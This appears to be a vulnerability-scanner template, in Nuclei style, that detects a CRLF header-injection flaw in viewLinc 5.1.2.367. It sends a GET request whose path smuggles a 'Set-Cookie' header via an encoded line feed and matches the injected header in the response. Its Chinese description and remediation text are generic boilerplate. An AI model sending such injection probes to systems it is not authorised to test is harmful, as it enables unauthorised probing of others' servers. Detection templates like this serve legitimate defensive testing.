id: viewlinc-crlf-injection

info:
  name: viewLinc 5.1.2.367 - Carriage Return Line Feed Attack
  author: geeknik
  severity: low
  description: |
    该模板用于检测 viewLinc 5.1.2.367 - Carriage Return Line Feed Attack。该问题通常源于受影响接口或组件缺少必要的输入校验、访问控制或安全边界限制。模板会向 `/%0ASet-Cookie:crlfinjection=crlfinjection` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能利用该缺陷访问敏感功能、读取或篡改数据，或扩大对目标系统的控制范围。
    - 在公网暴露、权限配置过宽或与其他缺陷组合时，可能造成更严重的业务中断和数据泄露。
  remediation: |
    - 升级受影响产品或组件到厂商修复版本，并移除不再维护的高风险功能。
    - 对相关接口增加认证、授权、输入校验和访问来源限制。
    - 复核访问日志和异常操作记录，确认是否存在已被利用的迹象。
  reference:
    - https://www.vaisala.com/en/products/systems/indoor-monitoring-systems/viewlinc-continuous-monitoring-system
  metadata:
    max-request: 1
  tags: crlf,viewlinc,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/%0ASet-Cookie:crlfinjection=crlfinjection"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "Server: viewLinc/5.1.2.367"
          - "Set-Cookie: crlfinjection=crlfinjection"
        part: header
        condition: and

      - type: word
        words:
          - "Server: viewLinc/5.1.1.50"
          - "Set-Cookie: crlfinjection=crlfinjection"
        part: header
        condition: and
